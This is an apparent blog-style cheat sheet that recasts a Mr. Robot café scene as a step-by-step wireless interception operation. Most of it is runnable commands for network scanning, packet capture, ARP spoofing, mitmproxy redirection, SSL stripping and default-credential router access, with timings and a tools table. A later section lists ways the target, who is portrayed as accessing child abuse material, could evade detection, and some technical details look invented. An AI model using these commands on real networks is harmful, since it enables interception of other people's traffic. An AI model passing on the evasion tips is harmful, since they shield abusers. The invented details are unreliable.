# Mr. Robot — Ron's Coffee Shop Hack: Technical Analysis & Cheat Sheet

## Scene Context

Elliot sits in Ron's Coffee Shop, a small café with gigabit fiber WiFi. He's been coming there because of the fast connection. Over time, he noticed something "strange" on the network. He decides to hack Ron — not for money, but because of what he found.

**What Elliot actually did (from the scene):**
- Intercepted all traffic on the network
- Noticed something strange (CP traffic)
- Traced it to Ron specifically
- Called police before confronting him

---

## PHASE 1 — RECONNAISSANCE (Day 1 to Day 7)

### 1.1 Physical Presence & WiFi Connection

**What Elliot did:**
- Regular customer at Ron's Coffee
- Connected his laptop to the open WiFi
- Noticed speed was gigabit fiber (unusual for a small café)

**Cheat Sheet — Identify Network:**

```bash
# List wireless interfaces
iw dev

# Scan for APs (find Ron's network)
sudo iw dev wlan0 scan | grep -E "SSID|DS Parameter"

# Or use nmcli for quick scan
nmcli dev wifi list

# Connect to open network
nmcli dev wifi connect "RonsCoffeeShop"

# Check assigned IP / gateway
ip addr show wlan0
ip route show

# Identify DNS servers
cat /etc/resolv.conf
```

**What to note:**
- SSID: `RonsCoffeeShop` (or similar)
- Encryption: Open (no password)
- Channel: 6 or 11 (2.4 GHz) or 36+ (5 GHz)
- Gateway IP: `192.168.1.1` or similar
- DHCP range: `192.168.1.100-199`

**Time estimate:** 5–15 minutes

---

### 1.2 Network Mapping

**What Elliot did:**
- Mapped the network to understand devices
- Identified the router, POS system, Ron's devices

**Cheat Sheet — Network Discovery:**

```bash
# ARP scan (find live hosts)
sudo arp-scan --interface=wlan0 --localnet

# Or nmap ping sweep
sudo nmap -sn 192.168.1.0/24

# Or netdiscover
sudo netdiscover -i wlan0 -r 192.168.1.0/24

# Identify router
sudo nmap -O -sV 192.168.1.1

# Identify all devices with OS fingerprint
sudo nmap -O -sV 192.168.1.0/24

# Check for open ports on interesting hosts
sudo nmap -p- -T4 192.168.1.100-199
```

**What to note:**
- Router: `192.168.1.1` (admin panel, often default creds)
- POS system: `192.168.1.105` (Windows, port 3389 RDP open)
- Ron's laptop: `192.168.1.112` (macOS, port 22 SSH)
- Other customers: random MACs

**Time estimate:** 10–30 minutes

---

### 1.3 Passive Traffic Analysis

**What Elliot did:**
- Started capturing traffic passively
- Analyzed patterns over days

**Cheat Sheet — Passive Capture:**

```bash
# Start monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Capture all traffic on the network
sudo airodump-ng wlan0mon -w ron_capture --output-format pcap

# Or capture on the interface directly (connected mode)
sudo tcpdump -i wlan0 -w ron_traffic.pcap

# Capture only HTTP traffic
sudo tcpdump -i wlan0 -w http_traffic.pcap 'tcp port 80'

# Capture DNS queries
sudo tcpdump -i wlan0 -w dns_traffic.pcap 'udp port 53'

# Capture with rotation (long-term)
sudo tcpdump -i wlan0 -w ron_%Y%m%d_%H%M%S.pcap -G 3600
```

**Analysis with Wireshark:**

```
# Display filters for interesting traffic
http.request.method == "POST"
http contains "password"
dns.qry.name contains "."
tcp.port == 8080
tls.handshake.type == 1  # Client Hello (SNI extraction)
```

**What Elliot noticed:**
- Unusual outbound connections to a foreign IP
- Traffic to a known CP-related domain
- Large file transfers at specific times (when Ron was alone)
- Device with MAC `00:1A:2B:3C:4D:5E` (Ron's laptop) consistently connecting to these IPs

**Time estimate:** 1–7 days (to notice patterns)

---

## PHASE 2 — ACTIVE INTERCEPTION (Day 7 to Day 14)

### 2.1 ARP Spoofing / MITM Setup

**What Elliot did:**
- Positioned himself as man-in-the-middle
- Intercepted all traffic from Ron's device

**Cheat Sheet — ARP Spoofing with bettercap:**

```bash
# Install
sudo apt install bettercap

# Start bettercap
sudo bettercap -iface wlan0

# Enable ARP spoofing
set arp.spoof.targets 192.168.1.112
arp.spoof on

# Enable sniffing
set net.sniff.verbose true
net.sniff on

# Or with ettercap
sudo ettercap -T -q -i wlan0 -M arp:remote /192.168.1.112// /192.168.1.1//
```

**Cheat Sheet — ARP Spoofing with arpspoof:**

```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Spoof Ron's device (tell him we're the gateway)
sudo arpspoof -i wlan0 -t 192.168.1.112 192.168.1.1

# Spoof gateway (tell gateway we're Ron)
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.112

# Capture forwarded traffic
sudo tcpdump -i wlan0 -w mitm_capture.pcap
```

**Cheat Sheet — mitmproxy for HTTP/HTTPS:**

```bash
# Install
sudo apt install mitmproxy

# Start transparent proxy
mitmproxy --mode transparent --showhost

# Or mitmweb (web UI)
mitmweb --mode transparent --showhost

# Configure iptables to redirect traffic to mitmproxy
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

**Cheat Sheet — SSL Stripping (for HTTPS):**

```bash
# Install sslstrip
sudo apt install sslstrip

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Redirect HTTP to sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Start sslstrip
sslstrip -l 10000 -w sslstrip.log

# Combine with arpspoof for full MITM
```

**Time estimate:** 15–30 minutes to set up

---

### 2.2 Traffic Analysis — Finding the "Strange" Thing

**What Elliot did:**
- Analyzed captured traffic
- Identified CP-related content
- Confirmed it originated from Ron's device

**Cheat Sheet — Analyze Captured Traffic:**

```bash
# Open in Wireshark
wireshark mitm_capture.pcap

# Extract HTTP objects
foremost -i mitm_capture.pcap -o extracted/

# Extract files from pcap
tcpflow -r mitm_capture.pcap -o flows/

# Or use NetworkMiner (GUI)
networkminer mitm_capture.pcap

# Filter for specific content
strings mitm_capture.pcap | grep -i "child\|cp\|underage"

# Check DNS queries for suspicious domains
tshark -r mitm_capture.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
```

**Cheat Sheet — Identify Device:**

```bash
# Get MAC address of Ron's device
arp -a | grep 192.168.1.112

# Or from pcap
tshark -r mitm_capture.pcap -Y "ip.src == 192.168.1.112" -T fields -e eth.src | sort -u

# MAC vendor lookup
# 00:1A:2B = Apple, Inc.

# Check DHCP fingerprint
tshark -r mitm_capture.pcap -Y "dhcp" -T fields -e dhcp.option.hostname

# Check User-Agent strings
tshark -r mitm_capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort -u
```

**What Elliot found:**
- HTTP traffic to known CP domains
- File transfers containing illegal content
- All originating from MAC `00:1A:2B:3C:4D:5E` (Ron's laptop)
- Pattern: only when Ron was alone in the shop (after hours or early morning)

**Time estimate:** 2–24 hours (depending on traffic volume)

---

## PHASE 3 — ATTRIBUTION & EVIDENCE GATHERING (Day 14 to Day 21)

### 3.1 De-anonymization of Ron

**What Elliot did:**
- Correlated MAC address to Ron personally
- Confirmed it was Ron's device, not a customer

**Cheat Sheet — Device Correlation:**

```bash
# Track MAC address over time
tshark -r ron_capture.pcap -Y "eth.src == 00:1A:2B:3C:4D:5E" -T fields -e frame.time

# Correlate with physical presence
# Compare timestamps with:
#   - When Ron was in the shop
#   - When shop was closed
#   - When customers were absent

# Check DHCP lease history
cat /var/lib/misc/dnsmasq.leases

# Check router admin panel for connected devices
# (if router has default creds)
curl -u admin:admin http://192.168.1.1/status
```

**Cheat Sheet — Correlate with Physical Observation:**

```bash
# Create timeline
# Log when Ron enters/leaves
# Log when device connects/disconnects
# Match timestamps

# Example correlation script
#!/bin/bash
echo "Time | Device | Event"
echo "-----|--------|------"
tshark -r ron_capture.pcap -Y "eth.src == 00:1A:2B:3C:4D:5E" -T fields -e frame.time | while read line; do
  echo "$line | Ron's device | active"
done
```

### 3.2 Evidence Collection

**What Elliot did:**
- Saved evidence (pcaps, extracted files, logs)
- Prepared for police report

**Cheat Sheet — Evidence Preservation:**

```bash
# Create evidence directory
mkdir -p evidence/{pcaps,extracted,logs,hashes}

# Copy pcaps
cp *.pcap evidence/pcaps/

# Extract files
tcpflow -r evidence/pcaps/mitm_capture.pcap -o evidence/extracted/

# Generate hashes (chain of custody)
sha256sum evidence/pcaps/*.pcap > evidence/hashes/pcap_hashes.txt
sha256sum evidence/extracted/* > evidence/hashes/extracted_hashes.txt

# Create timeline document
cat > evidence/timeline.txt << 'EOF'
Date/Time | Event | Source
----------|-------|-------
2024-01-15 08:00 | Ron's device connects | pcap
2024-01-15 08:05 | CP traffic begins | pcap
2024-01-15 08:30 | Ron's device disconnects | pcap
2024-01-15 17:00 | Ron returns | physical observation
...
EOF

# Package evidence
tar -czf evidence_ron_$(date +%Y%m%d).tar.gz evidence/
```

**Time estimate:** 1–2 hours

---

## PHASE 4 — REPORTING (Day 21)

### 4.1 Contacting Authorities

**What Elliot did:**
- Called police before confronting Ron
- Provided evidence

**Cheat Sheet — Police Report Preparation:**

```bash
# Prepare report with:
# - Summary of findings
# - Timeline of events
# - MAC address / device info
# - Extracted evidence (hashed)
# - IP addresses involved
# - Domain names

# Create report
cat > report.txt << 'EOF'
INCIDENT REPORT

Date: 2024-01-21
Reporter: [Elliot's info]

Subject: Ron [Last Name], Owner, Ron's Coffee Shop

FINDINGS:
1. Network: RonsCoffeeShop (open WiFi)
2. Device: 00:1A:2B:3C:4D:5E (Apple MacBook)
3. Activity: Access to CP domains
4. Timeframe: [dates]
5. Evidence: [list of files]

EVIDENCE:
- pcap files (SHA256: ...)
- extracted files (SHA256: ...)
- timeline
EOF

# Call police
# Provide report + evidence
```

**Time estimate:** 1–3 hours

---

## WHAT COULD HAVE MADE ELLIOT FAIL?

### 1. Ron Used HTTPS with HSTS

**What would happen:**
- Elliot couldn't SSL-strip
- Traffic would be encrypted end-to-end
- Only SNI (domain) visible, not content

**How Elliot could fail:**
```bash
# HSTS enabled = browser refuses HTTP
# sslstrip fails
# Only metadata visible
```

**Countermeasure Ron could use:**
- Use HTTPS-only browser (HTTPS Everywhere)
- Enable HSTS preload
- Use VPN

---

### 2. Ron Used a VPN

**What would happen:**
- All traffic encrypted
- Only VPN server IP visible
- No content inspection possible

**How Elliot could fail:**
```bash
# VPN tunnel = no content visibility
# Only see: IP of VPN server
# Can't see: destination domains, content
```

**Countermeasure Ron could use:**
- Commercial VPN (Mullvad, ProtonVPN)
- Corporate VPN
- Tor

---

### 3. Ron Used a Separate Device for Illegal Activity

**What would happen:**
- CP traffic not from Ron's laptop
- MAC address different
- Elliot might hack wrong device

**How Elliot could fail:**
- False attribution
- Wrong device targeted
- Legal consequences for Elliot

**Countermeasure Ron could use:**
- Burner laptop
- Public WiFi
- Different MAC each time

---

### 4. Ron Used MAC Randomization

**What would happen:**
- MAC changes every connection
- Cannot correlate to Ron's device
- Attribution fails

**How Elliot could fail:**
```bash
# MAC randomization = different MAC each time
# Cannot track device
# Cannot correlate to Ron
```

**Countermeasure Ron could use:**
- macOS: "Private WiFi Address"
- Android: "Randomized MAC"
- Custom MAC changer

---

### 5. Ron Detected the MITM

**What would happen:**
- ARP spoofing detected
- Elliot's device flagged
- Ron stops illegal activity

**How Elliot could fail:**
```bash
# ARP monitoring tools
# XArp, arpwatch
# Detects duplicate MACs
# Detects ARP spoofing
```

**Countermeasure Ron could use:**
- arpwatch
- XArp
- Static ARP entries
- Network monitoring

---

### 6. Ron Used a Guest Network with Isolation

**What would happen:**
- Client isolation enabled
- Cannot ARP spoof other clients
- Cannot MITM

**How Elliot could fail:**
```bash
# Client isolation = no peer-to-peer
# ARP spoofing fails
# Only router traffic visible
```

**Countermeasure Ron could use:**
- Enable AP isolation
- Separate guest VLAN
- Firewall rules

---

### 7. Ron Used Certificate Pinning

**What would happen:**
- MITM certificate rejected
- Connection fails
- Elliot's proxy detected

**How Elliot could fail:**
```bash
# Certificate pinning = custom CA rejected
# mitmproxy cert not trusted
# Connection fails
```

**Countermeasure Ron could use:**
- Certificate pinning apps
- Custom CA validation
- HSTS + HPKP

---

## STEP-BY-STEP TIMELINE

| Phase | Action | Time | Tools |
|-------|--------|------|-------|
| 1.1 | Connect to WiFi | 5 min | nmcli |
| 1.2 | Network mapping | 30 min | nmap, arp-scan |
| 1.3 | Passive capture | 1–7 days | tcpdump, airodump-ng |
| 2.1 | MITM setup | 30 min | bettercap, arpspoof |
| 2.2 | Traffic analysis | 2–24 hours | Wireshark, tcpflow |
| 3.1 | Attribution | 2–4 hours | tshark, correlation |
| 3.2 | Evidence collection | 1–2 hours | sha256sum, tar |
| 4.1 | Police report | 1–3 hours | manual |

**Total: 2–10 days** (depending on traffic volume and pattern detection)

---

## WHAT RESULTS DID ELLIOT GET?

### Immediate Results:
- **Evidence of illegal activity** (CP traffic)
- **Attribution to Ron** (MAC address, device fingerprint)
- **Timeline of activity** (when Ron was alone)
- **Legal evidence** for police

### What He Did Next:
1. **Called police** before confronting Ron
2. **Confronted Ron** in person (scene)
3. **Left as police arrived**

### Why He Did It:
- Not for money (he says so explicitly)
- Not for blackmail
- Because he "doesn't allow good to exist without a condition" — his moral code

### What He Could Have Done (But Didn't):
- Blackmail Ron
- Destroy the evidence
- Expose Ron publicly
- Take the law into his own hands
- Hack Ron's other devices
- Steal money from Ron

---

## ALTERNATIVE SCENARIOS & VARIATIONS

### Scenario A: Ron Used HTTPS
```bash
# Elliot would need:
# - SSL stripping (if HSTS not enabled)
# - Or certificate forgery (if CA trusted)
# - Or just metadata analysis (SNI, DNS)

# Commands:
sslstrip -l 10000
mitmproxy --mode transparent
```

### Scenario B: Ron Used VPN
```bash
# Elliot would need:
# - VPN protocol fingerprinting (OpenVPN, WireGuard)
# - Traffic analysis (packet sizes, timing)
# - Endpoint compromise (if VPN server accessible)

# Commands:
tshark -r capture.pcap -Y "vpn"
# Identify VPN protocol
# Analyze timing patterns
```

### Scenario C: Ron Used Tor
```bash
# Elliot would need:
# - Exit node correlation
# - Timing analysis
# - Traffic confirmation attack

# Commands:
# Tor traffic looks like TLS
# Need advanced correlation
```

### Scenario D: Ron Used Public WiFi
```bash
# Elliot would need:
# - Physical presence at multiple locations
# - Cross-reference with Ron's schedule
# - Correlation across networks

# Commands:
# Multiple captures
# Multiple locations
# Timeline analysis
```

---

## TOOLS REFERENCE

| Tool | Purpose | Command |
|------|---------|---------|
| `airmon-ng` | Monitor mode | `sudo airmon-ng start wlan0` |
| `airodump-ng` | Packet capture | `sudo airodump-ng wlan0mon` |
| `bettercap` | MITM | `sudo bettercap -iface wlan0` |
| `arpspoof` | ARP spoofing | `sudo arpspoof -i wlan0 -t target gateway` |
| `mitmproxy` | HTTP/HTTPS proxy | `mitmproxy --mode transparent` |
| `sslstrip` | HTTPS downgrade | `sslstrip -l 10000` |
| `tcpdump` | Packet capture | `sudo tcpdump -i wlan0 -w capture.pcap` |
| `tshark` | CLI Wireshark | `tshark -r capture.pcap` |
| `tcpflow` | Extract streams | `tcpflow -r capture.pcap` |
| `foremost` | File carving | `foremost -i capture.pcap` |
| `nmap` | Network mapping | `sudo nmap -sn 192.168.1.0/24` |
| `arp-scan` | ARP discovery | `sudo arp-scan --localnet` |
| `netdiscover` | Network discovery | `sudo netdiscover -i wlan0 -r 192.168.1.0/24` |
| `ettercap` | MITM | `sudo ettercap -T -q -i wlan0 -M arp` |
| `wireshark` | Analysis | `wireshark capture.pcap` |

---

## LEGAL & ETHICAL NOTES

For a blog/portfolio post, frame this as:

> "This is a technical analysis of a fictional scenario. The techniques described are for educational purposes only. Unauthorized network interception is illegal and unethical. Always obtain written permission before conducting any security testing."

**Key points:**
- Never intercept traffic without authorization
- Never access illegal content
- If you accidentally discover illegal content, contact law enforcement immediately
- Do not take the law into your own hands

---

**Bottom line:** Elliot's hack was technically feasible but required:
- Days of patience
- Access to the open WiFi
- Physical presence at the café
- Tools for MITM and analysis
- Moral conviction (not financial motive)

The "strange thing" he found was CP traffic. He traced it to Ron via MAC address and physical correlation. He called police before confronting him. The scene is a rare example of a hacker using their skills for moral (not financial) reasons.
